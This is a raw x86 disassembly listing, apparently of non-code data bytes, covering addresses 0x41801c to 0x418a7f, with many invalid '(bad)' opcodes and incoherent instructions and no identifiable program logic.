  41801c:	or     BYTE PTR [edx-0x41],ch
  41801f:	mov    cs,WORD PTR [ebx+0x740c10ea]
  418025:	jo     0x417fac
  418027:	push   ebx
  418028:	or     al,0x1a
  41802a:	mov    ds:0x938bbc4e,eax
  41802f:	inc    ecx
  418030:	jae    0x417ffd
  418032:	jge    0x418096
  418034:	jp     0x418036
	...
  418096:	test   eax,0xff456b7e
  41809b:	push   ebp
  41809c:	scas   eax,DWORD PTR es:[edi]
  41809d:	dec    BYTE PTR [ecx-0x6d44673c]
  4180a3:	jl     0x41807f
  4180a5:	sbb    DWORD PTR [ecx],esp
  4180a7:	cld    
  4180a8:	add    BYTE PTR [eax],al
  4180aa:	pop    es
  4180ab:	add    DWORD PTR [eax],eax
  4180ad:	add    BYTE PTR ds:0xbfb6410c,al
  4180b3:	mov    ebp,0x9bf6ebee
  4180b8:	test   eax,0x78083c92
  4180bd:	shl    DWORD PTR [ebx+ebp*8-0x3d74cb76],0x69
  4180c5:	es sahf 
  4180c7:	int3   
  4180c8:	mov    ebp,0x272e9039
  4180cd:	ds icebp 
  4180cf:	sahf   
  4180d0:	fistp  QWORD PTR [ebx]
  4180d2:	pop    ecx
  4180d3:	mov    ebp,0x6b80da32
  4180d8:	cld    
  4180d9:	or     eax,0xdda5582c
  4180de:	inc    esp
  4180df:	inc    esp
  4180e0:	pop    ds
  4180e1:	adc    ah,cl
  4180e3:	inc    ecx
  4180e4:	pop    ss
  4180e5:	jnp    0x418149
  4180e7:	dec    eax
  4180e8:	and    edi,DWORD PTR [esi-0x7f]
  4180eb:	mov    esp,?
  4180ed:	mov    cl,0xc8
  4180ef:	mov    eax,0x7790a3d9
  4180f4:	ins    BYTE PTR es:[edi],dx
  4180f5:	frstor [ebx]
  4180f7:	add    edx,DWORD PTR [eax]
  4180f9:	jg     0x4180da
  4180fb:	lods   al,BYTE PTR ds:[esi]
  4180fc:	push   0x49
  4180fe:	pop    edx
  4180ff:	outs   dx,DWORD PTR ds:[esi]
  418100:	(bad)  
  418102:	hlt    
  418103:	xor    DWORD PTR [edx-0x8],edi
  418106:	frstor [edx]
  418108:	cs pop edx
  41810a:	nop
  41810b:	ror    ebx,cl
  41810d:	jne    0x4180ab
  41810f:	mov    bh,0xb4
  418111:	jae    0x41818a
  418113:	fwait
  418114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418115:	clc    
  418116:	and    edi,eax
  418118:	jle    0x4180bd
  41811a:	(bad)  
  41811b:	dec    ecx
  41811c:	push   0xb7783c10
  418121:	inc    edx
  418122:	stos   DWORD PTR es:[edi],eax
  418123:	mov    bl,0x9c
  418125:	push   0xb2cb36ec
  41812a:	add    al,0x99
  41812c:	fdivr  DWORD PTR [ecx-0xe]
  41812f:	std    
  418130:	jne    0x4181a6
  418132:	jecxz  0x4180f9
  418134:	jmp    0xb16e:0xd36844e7
  41813b:	push   eax
  41813c:	je     0x41814b
  41813e:	sub    al,0xc5
  418140:	xchg   edi,eax
  418141:	sub    al,BYTE PTR [ecx]
  418143:	shl    bl,0xfd
  418146:	add    DWORD PTR [eax+0x8],esi
  418149:	loopne 0x418163
  41814b:	aas    
  41814c:	out    dx,al
  41814d:	mov    al,0x92
  41814f:	jo     0x418194
  418151:	sahf   
  418152:	in     eax,dx
  418153:	mov    dh,0x13
  418155:	js     0x418133
  418157:	adc    eax,0x79df147c
  41815c:	test   ah,ch
  41815e:	sar    BYTE PTR [ecx-0x235237d3],cl
  418164:	popa   
  418165:	cmp    ah,BYTE PTR [edx+0x47e9e9f9]
  41816b:	test   al,0xbf
  41816d:	ss mov al,0xb9
  418170:	sbb    DWORD PTR [edx+0x53caf4fe],esp
  418176:	push   edx
  418177:	adc    edi,DWORD PTR [ebx]
  418179:	nop
  41817a:	scas   al,BYTE PTR es:[edi]
  41817b:	sbb    dh,BYTE PTR [eax+ebx*1-0x5e75fc1c]
  418182:	(bad)  
  418183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418184:	test   DWORD PTR [eax-0x54173c22],ecx
  41818a:	dec    eax
  41818b:	sbb    al,BYTE PTR ds:0x97718bc3
  418191:	xor    BYTE PTR [eax],bl
  418193:	daa    
  418194:	ret    
  418195:	adc    al,0xc9
  418197:	je     0x4181ef
  418199:	mov    dl,0x9b
  41819b:	pop    ecx
  41819c:	cli    
  41819d:	es and al,0x8a
  4181a0:	ja     0x418157
  4181a2:	mul    BYTE PTR [edi]
  4181a4:	pop    ebp
  4181a5:	dec    edi
  4181a6:	xor    al,0xaa
  4181a8:	stos   BYTE PTR es:[edi],al
  4181a9:	mov    al,ds:0x3257815a
  4181ae:	cwde   
  4181af:	mov    edx,0x9645c0e9
  4181b4:	lock add BYTE PTR [eax],al
	...
  418213:	add    BYTE PTR [eax],al
  418215:	add    BYTE PTR [edi],dh
  418217:	xchg   edx,eax
  418218:	and    al,0x83
  41821a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41821b:	mov    bh,0xb7
  41821d:	mov    dh,0x16
  41821f:	mov    cl,ch
  418221:	(bad)  
  418222:	into   
  418223:	mov    cl,dl
  418225:	mov    ch,0x28
  418227:	std    
  418228:	add    BYTE PTR [eax],al
  41822a:	pop    es
  41822b:	add    DWORD PTR [eax],eax
  41822d:	add    bh,cl
  41822f:	loopne 0x41822f
  418231:	or     bh,BYTE PTR [ecx+edx*4-0x8]
  418235:	imul   esi,ebp,0xf7195f95
  41823b:	gs dec ebp
  41823d:	(bad)  
  41823e:	push   ds
  41823f:	loop   0x418291
  418241:	inc    eax
  418242:	mov    ebp,0xb6b67a8a
  418247:	jo     0x4182b2
  418249:	push   eax
  41824a:	in     al,dx
  41824b:	add    DWORD PTR [ebx+0xa],0x22
  41824f:	adc    eax,0x896a03f2
  418254:	sbb    edi,edx
  418256:	add    eax,0x90d4fb59
  41825b:	mov    ah,0x90
  41825d:	cwde   
  41825e:	cmp    al,0x7b
  418260:	sbb    dl,bl
  418262:	dec    esi
  418263:	and    eax,DWORD PTR [ebp+0x3183eba3]
  418269:	add    BYTE PTR [esp-0x19e61b29],bh
  418270:	je     0x418260
  418272:	mov    ebx,DWORD PTR [ecx]
  418274:	push   es
  418275:	xchg   ecx,eax
  418276:	in     al,0xe3
  418278:	sub    bl,BYTE PTR [edi+ebx*1+0x42]
  41827c:	and    eax,0x9b5fcd78
  418281:	pop    ebx
  418282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418283:	loopne 0x418238
  418285:	add    edi,DWORD PTR [edx]
  418287:	daa    
  418288:	xchg   edx,eax
  418289:	nop
  41828a:	push   ds
  41828b:	jge    0x418259
  41828d:	mov    BYTE PTR [edx-0x45],ch
  418290:	jbe    0x4182f4
  418292:	push   ebp
  418293:	out    0x32,al
  418295:	jg     0x418219
  418297:	je     0x41823f
  418299:	inc    esi
  41829a:	push   ecx
  41829b:	jne    0x418252
  41829d:	je     0x4182db
  41829f:	sbb    BYTE PTR [ebx],0x74
  4182a2:	lods   eax,DWORD PTR ds:[esi]
  4182a3:	imul   edx,DWORD PTR ss:[edx+0x412bd85b],0x4f
  4182ab:	dec    esp
  4182ac:	clc    
  4182ad:	jae    0x418233
  4182af:	xchg   edi,eax
  4182b0:	mov    dh,0x6a
  4182b2:	mov    ch,BYTE PTR [eax+edx*8]
  4182b5:	and    al,0x54
  4182b7:	pop    eax
  4182b8:	out    0x93,eax
  4182ba:	in     al,dx
  4182bb:	out    0x68,al
  4182bd:	xor    bl,dh
  4182bf:	sbb    BYTE PTR [edx+eiz*2+0x2f931575],al
  4182c6:	xchg   esp,eax
  4182c7:	fs adc eax,0x7df49ab5
  4182cd:	push   edx
  4182ce:	sub    ch,BYTE PTR [edx]
  4182d0:	(bad)  
  4182d1:	mov    ecx,0x7b3f3534
  4182d6:	sub    esp,edi
  4182d8:	mov    cl,0xc6
  4182da:	fs sub edx,0x3f
  4182de:	and    al,0xe2
  4182e0:	jno    0x418347
  4182e2:	push   cs
  4182e3:	jl     0x418275
  4182e5:	inc    edi
  4182e6:	inc    edx
  4182e7:	xchg   bh,dl
  4182e9:	lock jle 0x41833c
  4182ec:	sbb    esp,DWORD PTR [eax+0x3d9e252]
  4182f2:	lock push cs
  4182f4:	ja     0x418343
  4182f6:	imul   eax,DWORD PTR [edi],0x68aa90a8
  4182fc:	inc    edx
  4182fd:	pop    ecx
  4182fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182ff:	int    0x2b
  418301:	(bad)  
  418302:	pop    ebx
  418303:	shl    BYTE PTR [ebp-0x12],1
  418306:	imul   ebp,DWORD PTR [edx-0x43],0xffffffc1
  41830a:	(bad)  
  41830b:	push   cs
  41830c:	leave  
  41830d:	loop   0x41835c
  41830f:	jbe    0x4182f5
  418311:	or     eax,0x8de716bf
  418316:	xor    ah,dh
  418318:	push   eax
  418319:	cdq    
  41831a:	pushf  
  41831b:	push   ebp
  41831c:	sbb    BYTE PTR [ecx+0x3d5743a8],cl
  418322:	jbe    0x4182b3
  418324:	in     eax,dx
  418325:	or     edi,DWORD PTR [edi]
  418327:	out    dx,eax
  418328:	shl    BYTE PTR [edi+0x1f],cl
  41832b:	mov    DWORD PTR [edx+0x3a],ebx
  41832e:	push   eax
  41832f:	addr16 cs and eax,0x5598e1
	...
  418396:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41839c:	(bad)  
  41839d:	mov    edi,0xc253ee23
  4183a2:	scas   eax,DWORD PTR es:[edi]
  4183a3:	enter  0x9ad6,0x2f
  4183a7:	inc    BYTE PTR [eax]
  4183a9:	add    BYTE PTR [edi],al
  4183ab:	add    DWORD PTR [eax],eax
  4183ad:	add    dh,bl
  4183af:	ins    DWORD PTR es:[edi],dx
  4183b0:	repnz mov esp,0x4e0c9d00
  4183b6:	aas    
  4183b7:	(bad)  
  4183b8:	retf   0x2511
  4183bb:	pop    ebx
  4183bc:	or     eax,0xb8f4c3f9
  4183c1:	in     eax,dx
  4183c2:	add    eax,0xa6a32f3d
  4183c7:	or     eax,0xb97765fd
  4183cc:	(bad)  
  4183cd:	dec    edi
  4183ce:	add    ebp,DWORD PTR [ebx-0x1e]
  4183d1:	and    BYTE PTR [edx-0x79],al
  4183d4:	retf   
  4183d5:	add    cl,BYTE PTR [ecx]
  4183d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183d8:	push   edi
  4183d9:	(bad)  
  4183da:	push   ecx
  4183db:	add    al,0x4b
  4183dd:	xor    DWORD PTR ds:0xaabbb2e3,ecx
  4183e3:	mov    ds:0x6338ba92,eax
  4183e8:	cmp    BYTE PTR [esi+ecx*1+0x35],ah
  4183ec:	ror    DWORD PTR [ecx+0x161bf3c3],0xfd
  4183f3:	cmc    
  4183f4:	mov    ecx,0x341c7f80
  4183f9:	pusha  
  4183fa:	pusha  
  4183fb:	es xor al,0xed
  4183fe:	mov    esi,0x978d0777
  418403:	nop
  418404:	or     dl,BYTE PTR [eax]
  418406:	(bad)
  418409:	dec    esi
  41840a:	push   ebx
  41840b:	jo     0x418457
  41840d:	sub    cl,BYTE PTR [edi+0x67]
  418410:	inc    edi
  418411:	mov    ah,0x48
  418413:	mov    ebx,0x2522146
  418418:	mov    ebp,0xcb63066
  41841d:	in     eax,0xc0
  41841f:	fisubr WORD PTR [esi+esi*8-0x601fcdc]
  418426:	js     0x418461
  418428:	inc    edi
  418429:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41842b:	or     BYTE PTR [esi],ch
  41842d:	in     al,dx
  41842e:	sbb    al,0x1f
  418430:	or     DWORD PTR [ecx-0x547810ea],0xf35837b1
  41843a:	push   0xfffffffc
  41843c:	xchg   al,ch
  41843e:	inc    edi
  41843f:	adc    dl,BYTE PTR [ebx-0xa446743]
  418445:	sub    ch,BYTE PTR ds:0xb6129659
  41844b:	xchg   edx,eax
  41844c:	push   es
  41844d:	imul   esp,esp,0x919dfd1b
  418453:	ds aas 
  418455:	ins    DWORD PTR es:[edi],dx
  418456:	es fcmove st,st(4)
  418459:	ror    BYTE PTR [eax-0x4771b472],cl
  41845f:	addr16 push esp
  418461:	sub    edi,DWORD PTR [edx]
  418463:	loope  0x418490
  418465:	mov    esp,0x7050a9e1
  41846a:	fcomi  st,st(6)
  41846c:	jl     0x4184c5
  41846e:	test   DWORD PTR [edx],ebp
  418470:	jg     0x418496
  418472:	adc    BYTE PTR [eax-0x312498b0],bh
  418478:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41847a:	retf   
  41847b:	jne    0x418423
  41847d:	jne    0x4184c6
  41847f:	and    dh,BYTE PTR [esi]
  418481:	fldenv [edx-0x12]
  418484:	xchg   esp,eax
  418485:	jo     0x418411
  418487:	pushf  
  418488:	mov    ds:0x7b12877f,al
  41848d:	fsubr  QWORD PTR [ebx]
  41848f:	sub    ebx,ebp
  418491:	mov    bl,0x2f
  418493:	and    eax,0xc272e2ba
  418498:	fidivr DWORD PTR [ecx+0x6d79bac4]
  41849e:	add    cl,dh
  4184a0:	xor    BYTE PTR [edx],dh
  4184a2:	arpl   WORD PTR [ebp-0xefee1b2],ax
  4184a8:	sub    dh,BYTE PTR [edi-0x74]
  4184ab:	cmp    DWORD PTR [esi-0x6509460f],edx
  4184b1:	ja     0x4184ee
  4184b3:	lock loop 0x4184b6
	...
  418516:	inc    ecx
  418517:	stc    
  418518:	mov    ebx,ebx
  41851a:	mov    ebx,0x26fb51fb
  41851f:	xchg   edi,eax
  418520:	mov    ecx,DWORD PTR [edx+edx*2+0x3698b458]
  418527:	inc    DWORD PTR [eax]
  418529:	add    BYTE PTR [edi],al
  41852b:	add    DWORD PTR [eax],eax
  41852d:	add    cl,bl
  41852f:	jmp    0xd30e:0x807caa8c
  418536:	mov    al,ds:0xd52276b2
  41853b:	out    0x6f,eax
  41853d:	imul   edi,DWORD PTR [edx],0x2a
  418540:	adc    eax,DWORD PTR [edi-0x69]
  418543:	fsubr  st(3),st
  418545:	sbb    ecx,ebp
  418547:	pushf  
  418548:	jmp    0xa186:0xdff7803f
  41854f:	mov    cl,0xe7
  418551:	js     0x4185b8
  418553:	dec    edi
  418554:	ror    DWORD PTR [edx],0xfe
  418557:	hlt    
  418558:	mov    eax,ds:0x259ff983
  41855d:	and    al,0x5
  41855f:	in     al,dx
  418560:	dec    ebp
  418561:	in     eax,0x7f
  418563:	jg     0x41853c
  418565:	pop    ebp
  418566:	pop    ebx
  418567:	mov    cl,BYTE PTR [edi-0x4c]
  41856a:	not    bl
  41856c:	push   cs
  41856d:	mov    ds,WORD PTR [eax-0x1f765a70]
  418573:	ins    DWORD PTR es:[edi],dx
  418574:	lods   eax,DWORD PTR ds:[esi]
  418575:	dec    ecx
  418576:	pushf  
  418577:	imul   ebx,DWORD PTR [edx],0x2cb30a13
  41857d:	les    esp,FWORD PTR [eiz*8+0x4eddc5fb]
  418584:	stc    
  418585:	fs jae 0x4185c1
  418588:	or     BYTE PTR [edi-0x3fd3b64c],0xb1
  41858f:	test   BYTE PTR ds:0xf11c048b,0xe5
  418596:	mov    WORD PTR [ebp+0x7ae4846],ds
  41859c:	adc    al,0xe5
  41859e:	rol    BYTE PTR [edx],0xf6
  4185a1:	aas    
  4185a2:	add    BYTE PTR [ebx-0x7],ah
  4185a5:	leave  
  4185a6:	sbb    BYTE PTR [edx+0x54],ch
  4185a9:	popa   
  4185aa:	fadd   DWORD PTR [eax+ebx*2+0x41]
  4185ae:	jae    0x418545
  4185b0:	ret    
  4185b1:	fucomp st(5)
  4185b3:	add    eax,0x6b16c1cf
  4185b8:	xor    ebx,DWORD PTR [esi-0xb9b4345]
  4185be:	(bad)  
  4185bf:	out    dx,al
  4185c0:	inc    edi
  4185c1:	jge    0x41855d
  4185c3:	dec    ecx
  4185c4:	fld    TBYTE PTR ds:0x9a8bff60
  4185ca:	addr16 rol cl,cl
  4185cd:	push   ds
  4185ce:	test   al,0x4a
  4185d0:	push   ss
  4185d1:	fs push eax
  4185d3:	push   esi
  4185d4:	cdq    
  4185d5:	loope  0x418605
  4185d7:	mov    eax,ds:0x956a6b6
  4185dc:	xchg   ebp,eax
  4185dd:	leave  
  4185de:	cmp    edx,ecx
  4185e0:	inc    esi
  4185e1:	push   cs
  4185e2:	mov    bh,0x2
  4185e4:	and    BYTE PTR [ecx+0x4e481b8],cl
  4185ea:	lds    eax,FWORD PTR ss:[edi+0x43fa282b]
  4185f1:	test   BYTE PTR [edx-0x53170c43],bl
  4185f7:	pop    ds
  4185f8:	push   ebp
  4185f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185fa:	aad    0x44
  4185fc:	rcr    DWORD PTR [ebx],1
  4185fe:	inc    ebx
  4185ff:	aam    0x6
  418601:	lods   al,BYTE PTR ds:[esi]
  418602:	cmc    
  418603:	test   ebx,esi
  418605:	add    esp,esp
  418607:	sbb    DWORD PTR [edx+0x33928c59],0x5c3eab08
  418611:	outs   dx,DWORD PTR ds:[esi]
  418612:	sub    BYTE PTR [ebx-0x74],ah
  418615:	and    BYTE PTR [eax-0x3a234ac7],al
  41861b:	sub    DWORD PTR [eax-0x1c30a5cf],ebp
  418621:	mov    edx,0xa608f5f
  418626:	mov    esi,0x5bbee14
  41862b:	into   
  41862c:	jmp    0x418615
  41862e:	mov    BYTE PTR ds:0x10b782b1,ch
  418634:	mov    ebp,0x0
	...
  418695:	add    BYTE PTR [ebx-0x44c35fd8],dl
  41869b:	mov    esp,0xba07af9f
  4186a0:	xor    BYTE PTR [esi-0x44d21b24],bh
  4186a6:	cmp    eax,0x7000100
  4186ab:	add    DWORD PTR [eax],eax
  4186ad:	add    BYTE PTR [esi],cl
  4186af:	lods   eax,DWORD PTR ds:[esi]
  4186b0:	push   esi
  4186b1:	repnz mov esi,0xdd2ba3d2
  4186b7:	push   ss
  4186b8:	adc    esi,DWORD PTR ds:0x374963ca
  4186be:	push   ss
  4186bf:	adc    al,0xa8
  4186c1:	and    eax,0x7853d12b
  4186c6:	and    ebx,ecx
  4186c8:	cld    
  4186c9:	iret   
  4186ca:	cmove  edi,DWORD PTR [ebx-0x4e]
  4186ce:	loopne 0x418715
  4186d0:	bound  ebp,QWORD PTR [edi]
  4186d2:	xchg   DWORD PTR [eax+0x3],ebp
  4186d5:	push   ebp
  4186d6:	cmp    esp,DWORD PTR [ebp-0x2cb0df96]
  4186dc:	and    ecx,DWORD PTR [ebp-0x4d451890]
  4186e2:	push   0x37
  4186e4:	loope  0x418720
  4186e6:	mov    ebp,DWORD PTR [esi]
  4186e8:	xchg   edi,eax
  4186e9:	fstp   DWORD PTR [ecx+0x78a67560]
  4186ef:	pop    edx
  4186f0:	add    BYTE PTR [edx-0x684215fc],0xf6
  4186f7:	or     DWORD PTR [esi+0x4],ebx
  4186fa:	ret    
  4186fb:	sbb    bl,bh
  4186fd:	imul   ebx,DWORD PTR [ecx+0x1e830fc2],0xb68a551b
  418707:	add    DWORD PTR [ecx],0x43c5d891
  41870d:	fdiv   DWORD PTR [edi+ebp*2-0x13991ae0]
  418715:	hlt    
  418716:	push   ecx
  418717:	dec    ebp
  418718:	js     0x41876b
  41871a:	pop    edi
  41871b:	stc    
  41871c:	push   edi
  41871d:	shr    DWORD PTR [ecx-0x32],1
  418720:	pop    es
  418721:	sar    edx,1
  418723:	pop    ecx
  418724:	retf   0x69a6
  418727:	in     eax,0xa7
  418729:	jmp    eax
  41872b:	mov    BYTE PTR [edi],dl
  41872d:	je     0x4186d7
  41872f:	aam    0x1c
  418731:	mov    dh,0xf4
  418733:	and    esp,DWORD PTR [ebx+eiz*8]
  418736:	or     ah,cl
  418738:	aas    
  418739:	pop    edi
  41873a:	push   ebp
  41873b:	xlat   BYTE PTR ds:[ebx]
  41873c:	cmp    al,0x61
  41873e:	push   ds
  41873f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418740:	mov    ds:0xbf18f1e9,eax
  418745:	xor    bh,BYTE PTR [ebx+0x3194f1f3]
  41874b:	retf   
  41874c:	add    esi,DWORD PTR [ecx-0x3c]
  41874f:	sub    BYTE PTR ds:0x41d5d8b7,0x18
  418756:	inc    ecx
  418757:	and    eax,0x690dd22e
  41875c:	cwde   
  41875d:	(bad)  
  41875e:	out    0x8e,al
  418760:	fs stos BYTE PTR es:[edi],al
  418762:	popf   
  418763:	sub    BYTE PTR [edx+0x2a],ch
  418766:	mov    eax,0x3219a31c
  41876b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41876c:	pop    ss
  41876d:	push   ecx
  41876e:	jb     0x4187da
  418770:	sub    bl,cl
  418772:	cmp    eax,DWORD PTR [edi-0x49]
  418775:	test   BYTE PTR [eax+0x30],dl
  418778:	mov    DWORD PTR [edx],ecx
  41877a:	cmp    BYTE PTR [edx-0x3d4e088d],ch
  418780:	das    
  418781:	jmp    0x87ed83cc
  418786:	or     BYTE PTR [edi],dh
  418788:	add    eax,0xf9e50b64
  41878d:	lods   al,BYTE PTR ds:[esi]
  41878e:	sbb    BYTE PTR [eax-0x6820a15f],ch
  418794:	stos   DWORD PTR es:[edi],eax
  418795:	sbb    eax,DWORD PTR [eax]
  418797:	cdq    
  418798:	push   ss
  418799:	mov    ss,WORD PTR [edi]
  41879b:	pop    ds
  41879c:	stc    
  41879d:	and    al,0x7d
  41879f:	inc    eax
  4187a0:	pusha  
  4187a1:	rol    bl,0x81
  4187a4:	add    cl,ah
  4187a6:	cmp    al,0xe4
  4187a8:	sbb    al,0xc1
  4187aa:	inc    esi
  4187ab:	push   edi
  4187ac:	add    eax,0xf60c125b
  4187b1:	into   
  4187b2:	or     eax,0xbb2c
	...
  418813:	add    BYTE PTR [eax],al
  418815:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41881c:	hlt    
  41881d:	fisttp WORD PTR [eax]
  41881f:	test   eax,0xd8537be5
  418824:	in     eax,dx
  418825:	pushf  
  418826:	inc    esp
  418827:	add    DWORD PTR [ecx],eax
  418829:	add    BYTE PTR [edi],al
  41882b:	add    DWORD PTR [eax],eax
  41882d:	add    BYTE PTR [eax-0x4e],dh
  418830:	add    al,0x5b
  418832:	push   0x53
  418834:	sub    DWORD PTR ds:0xe282e46c,eax
  41883a:	loope  0x41885c
  41883c:	jae    0x41888a
  41883e:	(bad)  
  418840:	scas   al,BYTE PTR es:[edi]
  418841:	adc    al,0x15
  418843:	inc    eax
  418844:	xor    DWORD PTR [ebx-0x53],ecx
  418847:	sbb    ah,BYTE PTR [ecx-0x1b]
  41884a:	lods   eax,DWORD PTR ds:[esi]
  41884b:	stos   DWORD PTR es:[edi],eax
  41884c:	mov    ch,0xe4
  41884e:	enter  0xbdb0,0x51
  418852:	ret    0x5f70
  418855:	and    BYTE PTR [esi-0x66511371],dl
  41885b:	add    ebx,0xb5968477
  418861:	sbb    al,0xc0
  418863:	fbstp  TBYTE PTR [ebp-0x54d76607]
  418869:	cdq    
  41886a:	xor    al,0xfe
  41886c:	ins    DWORD PTR es:[edi],dx
  41886d:	cmp    cl,BYTE PTR [eax+ebx*2]
  418870:	pop    esp
  418871:	cmp    ebx,0x639a5af
  418877:	sti    
  418878:	fidiv  DWORD PTR [ebp+0x57]
  41887b:	dec    esi
  41887c:	dec    eax
  41887d:	pop    ds
  41887e:	pop    es
  41887f:	arpl   WORD PTR [ecx-0x5bfae684],dx
  418885:	les    ebx,FWORD PTR [esi]
  418887:	jmp    0xffe92786
  41888c:	mov    dl,0xa5
  41888e:	xor    al,dh
  418890:	ficom  DWORD PTR [edx+0x44540ecd]
  418896:	out    dx,al
  418897:	add    edi,esp
  418899:	or     BYTE PTR ds:0xd45209ec,dl
  41889f:	out    0x3c,eax
  4188a1:	int    0x34
  4188a3:	adc    al,dl
  4188a5:	jbe    0x418876
  4188a7:	sub    eax,0x25f00af9
  4188ac:	stos   BYTE PTR es:[edi],al
  4188ad:	add    al,BYTE PTR [ebx+0x53]
  4188b0:	mov    esp,0xb79135bf
  4188b5:	retf   0xd483
  4188b8:	or     BYTE PTR ds:0xe2ef9d24,bh
  4188be:	xchg   esi,eax
  4188bf:	cld    
  4188c0:	dec    esp
  4188c1:	and    BYTE PTR [eax+ebp*1],bl
  4188c4:	push   edi
  4188c5:	mov    ebp,0xcb442816
  4188ca:	and    ah,BYTE PTR [ebp+0x40]
  4188cd:	mov    ebp,0xe4454f35
  4188d2:	and    eax,0x7cd1e6fb
  4188d7:	push   0xffffffb6
  4188d9:	sub    al,0xcb
  4188db:	xchg   esi,eax
  4188dc:	sbb    dl,ch
  4188de:	xlat   BYTE PTR ds:[ebx]
  4188df:	xchg   ecx,eax
  4188e0:	in     eax,dx
  4188e1:	jmp    0x34a:0x6a4bb84c
  4188e8:	mov    ah,BYTE PTR [ebx+0x5e]
  4188eb:	sub    al,0x90
  4188ed:	jecxz  0x4188bf
  4188ef:	mov    ebx,0x841d1a7f
  4188f4:	out    dx,al
  4188f5:	xchg   esi,eax
  4188f6:	pop    ecx
  4188f7:	inc    ebp
  4188f8:	outs   dx,BYTE PTR ss:[esi]
  4188fa:	sub    al,0x7d
  4188fc:	aaa    
  4188fd:	push   esp
  4188fe:	sub    eax,0x180cca01
  418903:	jle    0x418977
  418905:	mov    al,al
  418907:	sar    DWORD PTR [esi+0x1c5ff2d2],1
  41890d:	jmp    FWORD PTR [ebx+0x4d]
  418910:	mov    DWORD PTR [ebx],edi
  418912:	adc    eax,0x9d45dd62
  418917:	xchg   ecx,eax
  418918:	stos   BYTE PTR es:[edi],al
  418919:	(bad)  
  41891a:	cmc    
  41891b:	cmp    eax,DWORD PTR [ecx+edi*1-0x1e]
  41891f:	mov    ah,0x3
  418921:	xchg   esp,eax
  418922:	bound  esp,QWORD PTR [ebp-0x2b22be90]
  418928:	enter  0xd15a,0x62
  41892c:	cmp    BYTE PTR [ebx+0x7d],dl
  41892f:	inc    esp
  418930:	mov    DWORD PTR [esi],esp
  418932:	loop   0x4188c3
  418934:	sub    al,BYTE PTR [eax]
	...
  418996:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  41899c:	into   
  41899d:	fwait
  41899e:	cmc    
  41899f:	pop    edx
  4189a0:	sub    ecx,DWORD PTR [esi+0x71c8c0e2]
  4189a6:	dec    ebx
  4189a7:	add    al,BYTE PTR [ecx]
  4189a9:	add    BYTE PTR [edi],al
  4189ab:	add    DWORD PTR [eax],eax
  4189ad:	add    BYTE PTR [ebx+0x7a],ch
  4189b0:	mov    al,ds:0xbd1865da
  4189b5:	mov    al,ds:0xc8cf6fa9
  4189ba:	push   ecx
  4189bb:	mov    edi,0xca64f6fe
  4189c0:	sbb    ebp,0xffffffe1
  4189c3:	add    edx,DWORD PTR [eax]
  4189c5:	push   ebx
  4189c6:	shl    BYTE PTR [ebp-0x3c410f37],cl
  4189cc:	push   ecx
  4189cd:	mov    edx,0x1283eb5d
  4189d2:	imul   esi,DWORD PTR [edi+0x2e],0x36
  4189d6:	xchg   esi,ebp
  4189d8:	dec    eax
  4189d9:	jno    0x418a32
  4189db:	cmp    ebx,ebp
  4189dd:	jg     0x418a24
  4189df:	cs popa 
  4189e1:	pusha  
  4189e2:	xlat   BYTE PTR ds:[ebx]
  4189e3:	xchg   esp,eax
  4189e4:	mov    ds:0x6dd4d7e5,eax
  4189e9:	sahf   
  4189ea:	neg    al
  4189ec:	inc    edx
  4189ed:	jmp    0x4189dd
  4189ef:	cld    
  4189f0:	jo     0x418984
  4189f2:	daa    
  4189f3:	xchg   dl,ah
  4189f5:	pop    edi
  4189f6:	sub    ecx,esp
  4189f8:	je     0x418a47
  4189fa:	adc    edi,ecx
  4189fc:	in     eax,0x16
  4189fe:	sar    BYTE PTR ds:0xdbe55e8e,cl
  418a04:	xchg   ebp,eax
  418a05:	sbb    DWORD PTR [esi],ebx
  418a07:	(bad)  
  418a08:	mov    al,0x97
  418a0a:	add    cl,bh
  418a0c:	(bad)  
  418a0d:	mov    esi,cs
  418a0f:	inc    ecx
  418a10:	addr16 sti 
  418a12:	pop    ds
  418a13:	imul   edx,DWORD PTR [ebp+0x3ba95bc2],0x757ef208
  418a1d:	popa   
  418a1e:	es cli 
  418a20:	sti    
  418a21:	loope  0x418a95
  418a23:	mov    BYTE PTR [ecx+0x71],dh
  418a26:	fidiv  DWORD PTR [ecx]
  418a28:	jnp    0x418a86
  418a2a:	inc    ebp
  418a2b:	jbe    0x4189f0
  418a2d:	pop    es
  418a2e:	mov    dh,0xe1
  418a30:	mov    ebx,0xe6991e8f
  418a35:	cli    
  418a36:	pushf  
  418a37:	lahf   
  418a38:	mov    ds:0xc8ac9181,al
  418a3d:	imul   edx,DWORD PTR ds:0x358fbbd9,0xb45e6c92
  418a47:	mov    bl,0x99
  418a49:	xlat   BYTE PTR ds:[ebx]
  418a4a:	adc    al,0xfe
  418a4c:	(bad)  
  418a4d:	mov    esp,0xd69cd002
  418a52:	jns    0x418a37
  418a54:	mov    fs,WORD PTR [ebp+0x39]
  418a57:	out    0x5f,al
  418a59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a5a:	js     0x418aaa
  418a5c:	xchg   BYTE PTR [eax+0xd],dh
  418a5f:	stos   DWORD PTR es:[edi],eax
  418a60:	sub    ch,ch
  418a62:	das    
  418a63:	ret    
  418a64:	mov    ch,0xfa
  418a66:	jo     0x418a09
  418a68:	push   0xffffff83
  418a6a:	arpl   WORD PTR [edx],di
  418a6c:	ss popa 
  418a6e:	jecxz  0x418a11
  418a70:	jno    0x418ae0
  418a72:	push   ss
  418a73:	adc    ch,BYTE PTR [ebx-0x53]
  418a76:	jge    0x418a75
  418a78:	push   esp
  418a79:	pop    ss
  418a7a:	jbe    0x418a74
  418a7c:	push   0x2d
  418a7e:	push   ds
  418a7f:	fwait
